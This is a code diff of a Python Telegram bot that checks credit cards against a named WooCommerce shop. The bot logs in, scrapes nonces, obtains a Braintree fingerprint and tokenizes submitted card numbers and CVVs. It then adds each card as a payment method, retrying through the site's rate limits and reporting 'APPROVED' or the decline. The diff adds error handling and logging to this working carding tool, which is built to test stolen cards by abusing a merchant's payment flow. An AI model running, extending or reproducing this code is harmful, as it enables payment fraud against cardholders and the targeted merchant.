@@ -125,116 +125,222 @@ def bt_h(fp):
     }
 
 def login():
-    s = requests.Session()
-    r = s.get('https://livresq.com/en/my-account/', headers=h1())
-    n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
-    if not n: return None
-    print("Login Nonce:", n.group(1))
-    d = {
-        'username': EMAIL,
-        'password': PASSWORD,
-        'woocommerce-login-nonce': n.group(1),
-        '_wp_http_referer': '/en/contul-meu/',
-        'login': 'Log in',
-        'trp-form-language': 'en'
-    }
-    r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d)
-    if 'woocommerce-error' in r.text or not ('logout' in r.text.lower() or 'dashboard' in r.text.lower()):
+    """Fixed login function with better error detection"""
+    try:
+        s = requests.Session()
+        r = s.get('https://livresq.com/en/my-account/', headers=h1())
+        
+        # Extract nonce
+        n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
+        if not n:
+            print("❌ LOGIN ERROR: Could not extract login nonce")
+            return None
+        
+        print("✅ Login Nonce found:", n.group(1))
+        
+        d = {
+            'username': EMAIL,
+            'password': PASSWORD,
+            'woocommerce-login-nonce': n.group(1),
+            '_wp_http_referer': '/en/contul-meu/',
+            'login': 'Log in',
+            'trp-form-language': 'en'
+        }
+        
+        r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d)
+        print(f"Response Status: {r.status_code}")
+        
+        # Check for error messages
+        if 'woocommerce-error' in r.text:
+            print("❌ LOGIN ERROR: WooCommerce error detected")
+            error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
+            if error_match:
+                error_msg = error_match.group(1).strip()
+                print(f"Error message: {error_msg}")
+            return None
+        
+        # Check for success indicators (multiple variations)
+        response_lower = r.text.lower()
+        success_keywords = ['logout', 'log out', 'dashboard', 'profile', 'my account', 'welcome']
+        
+        if any(keyword in response_lower for keyword in success_keywords):
+            print("✅ LOGIN SUCCESSFUL!")
+            return s
+        else:
+            print("❌ LOGIN ERROR: No success indicators found")
+            print("Response snippet:", r.text[:500])
+            return None
+            
+    except Exception as e:
+        print(f"❌ LOGIN ERROR: {str(e)}")
         return None
-    return s
 
 def get_nonces(s):
-    r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3())
-    an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
-    print("Add Nonce:", an.group(1) if an else "NOT FOUND")
-    cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
-    if not cn:
-        cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
-    print("Client Nonce:", cn.group(1) if cn else "NOT FOUND")
-    if not an or not cn: return None, None
-    return an.group(1), cn.group(1)
+    """Extract nonces from add payment method page"""
+    try:
+        r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3())
+        
+        # Extract add payment method nonce
+        an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
+        print("✅ Add Nonce found" if an else "❌ Add Nonce NOT FOUND")
+        
+        # Extract client token nonce
+        cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
+        if not cn:
+            cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
+        
+        print("✅ Client Nonce found" if cn else "❌ Client Nonce NOT FOUND")
+        
+        if not an or not cn:
+            return None, None
+        
+        return an.group(1), cn.group(1)
+    except Exception as e:
+        print(f"❌ ERROR in get_nonces: {str(e)}")
+        return None, None
 
 def get_fp(s, cn):
-    if not cn: return None
-    d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
-    r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d)
-    if r.status_code != 200: return None
+    """Get authorization fingerprint from Braintree"""
+    if not cn:
+        print("❌ ERROR: Client nonce is None")
+        return None
+    
     try:
+        d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
+        r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d)
+        
+        if r.status_code != 200:
+            print(f"❌ ERROR: Status code {r.status_code}")
+            return None
+        
         j = r.json()
         dt = base64.b64decode(j['data']).decode('utf-8')
         fp = json.loads(dt).get('authorizationFingerprint')
-        print("Fingerprint:", fp)
-        return fp
-    except:
+        
+        if fp:
+            print("✅ Fingerprint obtained successfully")
+            return fp
+        else:
+            print("❌ ERROR: Could not extract fingerprint")
+            return None
+            
+    except Exception as e:
+        print(f"❌ ERROR in get_fp: {str(e)}")
         return None
 
 async def tok(fp, cc, mm, yy, cv):
-    async with aiohttp.ClientSession() as ses:
-        sid = str(uuid.uuid4())
-        q = {
-            'clientSdkMetadata': {'source':'client','integration':'custom','sessionId':sid},
-            'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
-                tokenizeCreditCard(input: $input) {
-                    token
-                }
-            }''',
-            'variables': {
-                'input': {
-                    'creditCard': {'number':cc,'expirationMonth':mm,'expirationYear':yy,'cvv':cv},
-                    'options': {'validate': False}
-                }
-            },
-            'operationName': 'TokenizeCreditCard'
-        }
-        async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q) as resp:
-            if resp.status != 200: return None
-            res = await resp.json()
-            token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
-            print("Token:", token)
-            return token
+    """Tokenize credit card via Braintree GraphQL"""
+    try:
+        async with aiohttp.ClientSession() as ses:
+            sid = str(uuid.uuid4())
+            q = {
+                'clientSdkMetadata': {'source':'client','integration':'custom','sessionId':sid},
+                'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
+                    tokenizeCreditCard(input: $input) {
+                        token
+                    }
+                }''',
+                'variables': {
+                    'input': {
+                        'creditCard': {'number':cc,'expirationMonth':mm,'expirationYear':yy,'cvv':cv},
+                        'options': {'validate': False}
+                    }
+                },
+                'operationName': 'TokenizeCreditCard'
+            }
+            async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q) as resp:
+                if resp.status != 200:
+                    print(f"❌ ERROR: Braintree status code {resp.status}")
+                    return None
+                
+                res = await resp.json()
+                token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
+                
+                if token:
+                    print("✅ Token generated successfully")
+                    return token
+                else:
+                    print("❌ ERROR: Could not generate token")
+                    print("Response:", res)
+                    return None
+                    
+    except Exception as e:
+        print(f"❌ ERROR in tok: {str(e)}")
+        return None
 
 def add_pm(s, pt, an):
-    for _ in range(4):
-        pd = {
-            'payment_method': 'braintree_credit_card',
-            'wc-braintree-credit-card-card-type': 'visa',
-            'wc-braintree-credit-card-3d-secure-enabled': '',
-            'wc-braintree-credit-card-3d-secure-verified': '',
-            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-            'wc_braintree_credit_card_payment_nonce': pt,
-            'wc_braintree_device_data': '',
-            'wc-braintree-credit-card-tokenize-payment-method': 'true',
-            'woocommerce-add-payment-method-nonce': an,
-            '_wp_http_referer': '/en/contul-meu/add-payment-method/',
-            'woocommerce_add_payment_method': '1',
-            'trp-form-language': 'en'
-        }
-        r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd)
-        if 'You cannot add a new payment method so soon' in r.text:
-            time.sleep(15)
-            continue
-        em = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
-        if em:
-            et = re.sub(r'\s+', ' ', em.group(1).strip())
-            et = re.sub(r'&nbsp;', ' ', et)
-            return False, et
-        if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
-            return True, "APPROVED"
-        sm = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
-        if sm:
-            st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
-            st = re.sub(r'\s+', ' ', st)
-            return True, st
-        time.sleep(15)
+    """Add payment method to account"""
+    for attempt in range(4):
+        try:
+            pd = {
+                'payment_method': 'braintree_credit_card',
+                'wc-braintree-credit-card-card-type': 'visa',
+                'wc-braintree-credit-card-3d-secure-enabled': '',
+                'wc-braintree-credit-card-3d-secure-verified': '',
+                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+                'wc_braintree_credit_card_payment_nonce': pt,
+                'wc_braintree_device_data': '',
+                'wc-braintree-credit-card-tokenize-payment-method': 'true',
+                'woocommerce-add-payment-method-nonce': an,
+                '_wp_http_referer': '/en/contul-meu/add-payment-method/',
+                'woocommerce_add_payment_method': '1',
+                'trp-form-language': 'en'
+            }
+            r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd)
+            
+            # Rate limiting check
+            if 'You cannot add a new payment method so soon' in r.text:
+                print(f"⏱️  Rate limited, waiting 15s (attempt {attempt + 1}/4)")
+                time.sleep(15)
+                continue
+            
+            # Error check
+            em = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
+            if em:
+                et = re.sub(r'\s+', ' ', em.group(1).strip())
+                et = re.sub(r'&nbsp;', ' ', et)
+                print(f"❌ Card Error: {et}")
+                return False, et
+            
+            # Success check
+            if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
+                print("✅ CARD APPROVED")
+                return True, "APPROVED"
+            
+            # Message check
+            sm = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
+            if sm:
+                st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
+                st = re.sub(r'\s+', ' ', st)
+                print(f"✅ Card Response: {st}")
+                return True, st
+            
+            # Wait before retry
+            if attempt < 3:
+                time.sleep(15)
+                
+        except Exception as e:
+            print(f"❌ ERROR in add_pm: {str(e)}")
+    
+    print("❌ Unknown error after retries")
     return False, "UNKNOWN"
 
 async def proc(s, cc, mm, yy, cv):
+    """Main processing function"""
+    print("\n--- Starting Card Processing ---")
+    
     an, cn = get_nonces(s)
-    if not an or not cn: return False, "NONCES FAILED"
+    if not an or not cn:
+        return False, "NONCES FAILED"
+    
     fp = get_fp(s, cn)
-    if not fp: return False, "FINGERPRINT FAILED"
+    if not fp:
+        return False, "FINGERPRINT FAILED"
+    
     pt = await tok(fp, cc, mm, yy, cv)
-    if not pt: return False, "TOKENIZE FAILED"
+    if not pt:
+        return False, "TOKENIZE FAILED"
+    
     return add_pm(s, pt, an)
 
 # ---------- TELEGRAM HANDLER ----------
@@ -268,6 +374,7 @@ async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not s:
             await update.message.reply_text("❌ LOGIN FAILED")
             return
+        
         ok, msg = await proc(s, cc, mes, ano, cvv)
         if ok:
             await update.message.reply_text(f"✅ Response: {msg}")
